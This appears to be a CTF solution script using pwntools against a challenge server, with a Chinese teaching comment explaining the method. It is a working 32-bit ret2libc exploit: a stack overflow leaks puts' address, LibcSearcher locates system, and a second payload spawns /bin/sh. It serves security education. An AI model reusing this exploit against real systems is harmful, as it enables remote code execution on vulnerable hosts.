from pwn import *
from LibcSearcher import *

context.log_level = 'debug'

p = remote('pwn.challenge.ctf.show', 28237)
elf = ELF('../code/pwn')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['main']

offset = 0x208 + 4

payload = b'a' * offset + p32(puts_plt) + p32(main_addr) + p32(puts_got)

p.recvuntil('Enter your input: ')
p.sendline(payload)

puts_addr = u32(p.recvuntil('\xf7')[-4:])
log.success(hex(puts_addr))

libc = LibcSearcher('puts', puts_addr)

libcbase = puts_addr - libc.dump('puts')

sys_addr = libcbase + libc.dump('system')
bin_sh_addr = libcbase + libc.dump('str_bin_sh')

payload2 = b'a' * offset + p32(sys_addr) + p32(main_addr) + p32(bin_sh_addr)
p.recvuntil('Enter your input: ')
p.sendline(payload2)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2libc - 返回libc库函数
2. 核心原理：
   - 程序没有后门函数，但动态链接了libc
   - 利用栈溢出跳转到libc中的函数（如system）
   - 需要泄露libc地址或已知libc版本
3. 利用方式：
   - 泄露libc地址：通过GOT表泄露函数地址，计算libc基址
   - 直接利用：程序提供libc地址或已知libc版本
4. 关键步骤：
   - 泄露libc函数地址（如puts、write）
   - 使用LibcSearcher识别libc版本
   - 计算system和/bin/sh地址
   - 构造ROP链调用system("/bin/sh")
5. 注意：64位需要pop_rdi gadget传递参数
"""
